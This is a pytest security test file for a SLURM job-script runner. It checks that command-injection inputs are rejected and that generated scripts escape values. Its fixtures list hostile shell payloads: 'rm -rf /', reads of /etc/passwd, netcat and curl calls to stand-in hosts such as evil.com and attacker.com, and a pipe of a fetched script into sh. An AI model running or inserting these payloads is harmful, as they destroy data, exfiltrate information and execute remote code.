"""
Security tests for SLURM runner command injection vulnerabilities.

Tests that all user-supplied values are properly escaped to prevent
shell command injection attacks.
"""

import pytest
import shlex
from pathlib import Path
from unittest.mock import MagicMock
from src.runners.slurm_runner import SLURMRunner, SLURMJobConfig, SLURMValidationError
from src.runners.slurm_templates import (
    SLURMTemplateGenerator,
    SLURMTemplateValidationError,
)


class TestSLURMValidationSecurity:
    """Test command injection vulnerability fixes in validation methods."""

    def test_malicious_job_name_blocked(self):
        """Test that malicious job names are blocked by validation."""
        malicious_names = [
            "test; rm -rf /",
            "test$(whoami)",
            "test`cat /etc/passwd`",
            "test|nc attacker.com 1234",
            "test&& curl http://evil.com/shell.sh|sh",
        ]

        for name in malicious_names:
            with pytest.raises(SLURMValidationError):
                SLURMRunner._validate_job_name(name)

    def test_valid_job_name_accepted(self):
        """Test that valid job names are accepted."""
        valid_names = [
            "my_job",
            "test-calculation",
            "crystal_run_123",
            "JOB_NAME_2024",
        ]

        for name in valid_names:
            # Should not raise
            SLURMRunner._validate_job_name(name)

    def test_invalid_work_directory_blocked(self):
        """Test that invalid work directories are blocked."""
        malicious_paths = [
            "/scratch/test; rm -rf /",
            "/scratch/$(whoami)",
            "/scratch/`cat /etc/passwd`",
            "/scratch/|nc attacker.com 1234",
        ]

        # Use template generator directly for validation
        generator = SLURMTemplateGenerator()

        for path in malicious_paths:
            with pytest.raises(SLURMTemplateValidationError):
                generator.generate(job_name="test", work_dir=path)

    def test_dangerous_environment_setup_blocked(self):
        """Test that dangerous environment setup commands are blocked."""
        dangerous_setups = [
            "export PATH=/malicious; curl http://evil.com/shell.sh|sh",
            "export HOME=$(whoami)",
            "export VAR=`cat /etc/passwd`",
            "rm -rf /tmp/*",
            "curl http://attacker.com/exfiltrate?data=$(hostname)",
        ]

        generator = SLURMTemplateGenerator()

        for setup in dangerous_setups:
            with pytest.raises(SLURMTemplateValidationError):
                generator.generate(
                    job_name="test",
                    work_dir="/scratch/test",
                    environment_setup=setup
                )

    def test_safe_environment_setup_accepted(self):
        """Test that safe environment setup commands are accepted."""
        safe_setups = [
            "export OMP_NUM_THREADS=4",
            "export CRYSTAL_ROOT=/opt/crystal",
            "source /etc/profile.d/modules.sh",
            ". /etc/bashrc",
        ]

        generator = SLURMTemplateGenerator()

        for setup in safe_setups:
            # Should not raise
            script = generator.generate(
                job_name="test",
                work_dir="/scratch/test",
                environment_setup=setup
            )
            assert setup in script

    def test_array_spec_validation(self):
        """Test that array specifications are validated."""
        valid_specs = ["1-10", "1,3,5,7", "1-100:2", "1-10,20-30"]
        invalid_specs = ["1-10; rm -rf /", "$(whoami)", "`ls`"]

        for spec in valid_specs:
            # Should not raise
            SLURMRunner._validate_array_spec(spec)

        for spec in invalid_specs:
            with pytest.raises(SLURMValidationError):
                SLURMRunner._validate_array_spec(spec)

    def test_dependency_validation(self):
        """Test that job dependencies are validated."""
        valid_deps = ["123", "456"]
        invalid_deps = ["123; rm -rf /", "$(whoami)", "`ls`"]

        for dep in valid_deps:
            # Should not raise
            SLURMRunner._validate_dependency(dep)

        for dep in invalid_deps:
            with pytest.raises(SLURMValidationError):
                SLURMRunner._validate_dependency(dep)

    def test_module_validation(self):
        """Test that module names are validated."""
        valid_modules = ["crystal23", "intel/2023.1", "openmpi-4.1.5", "gcc-11.2.0"]
        invalid_modules = ["module; rm -rf /", "$(whoami)", "`ls`", "mod|nc evil.com"]

        for module in valid_modules:
            # Should not raise
            SLURMRunner._validate_module(module)

        for module in invalid_modules:
            with pytest.raises(SLURMValidationError):
                SLURMRunner._validate_module(module)

    def test_email_validation(self):
        """Test that email addresses are validated."""
        valid_emails = ["user@example.com", "test.user@domain.org", "admin@sub.domain.edu"]
        invalid_emails = ["not-an-email", "user@", "@domain.com", "user@domain", "'; rm -rf /"]

        for email in valid_emails:
            # Should not raise
            SLURMRunner._validate_email(email)

        for email in invalid_emails:
            with pytest.raises(SLURMValidationError):
                SLURMRunner._validate_email(email)


class TestSLURMScriptGeneration:
    """Test that SLURM script generation properly escapes values."""

    def test_script_generation_escapes_job_name(self):
        """Test that job name is properly escaped in SLURM script."""
        generator = SLURMTemplateGenerator()
        script = generator.generate(job_name="my_job-123", work_dir="/scratch/test")

        # Check that job name appears in script (either quoted or unquoted if alphanumeric)
        assert "my_job-123" in script
        assert "--job-name=" in script

    def test_script_generation_escapes_work_dir(self):
        """Test that work directory is properly escaped in cd command."""
        generator = SLURMTemplateGenerator()
        script = generator.generate(job_name="test", work_dir="/scratch/test/path")

        # Work dir should appear in cd command
        assert "cd " in script
        assert "/scratch/test/path" in script

    def test_script_generation_escapes_modules(self):
        """Test that module names are properly escaped."""
        generator = SLURMTemplateGenerator()
        script = generator.generate(
            job_name="test",
            work_dir="/scratch/test",
            modules=["crystal23", "intel/2023.1", "openmpi-4.1.5"]
        )

        # Each module should appear in script
        for module in ["crystal23", "intel/2023.1", "openmpi-4.1.5"]:
            assert "module load " in script
            assert module in script

    def test_script_generation_escapes_partition(self):
        """Test that partition name is properly escaped."""
        generator = SLURMTemplateGenerator()
        script = generator.generate(
            job_name="test",
            work_dir="/scratch/test",
            partition="compute"
        )

        # Partition should appear in script
        assert "--partition=" in script
        assert "compute" in script

    def test_complete_script_validation(self):
        """Test that a complete SLURM script is generated safely."""
        generator = SLURMTemplateGenerator()
        script = generator.generate(
            job_name="test_job",
            work_dir="/scratch/crystal/test",
            partition="compute",
            account="project123",
            modules=["crystal23", "intel/2023.1"],
            environment_setup="export OMP_NUM_THREADS=4",
        )

        # Verify script structure
        assert "#!/bin/bash" in script
        assert "--job-name=" in script
        assert "--partition=" in script
        assert "--account=" in script
        assert "module load " in script
        assert "export OMP_NUM_THREADS=" in script
        assert "cd " in script
        assert "crystalOMP" in script or "srun" in script


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
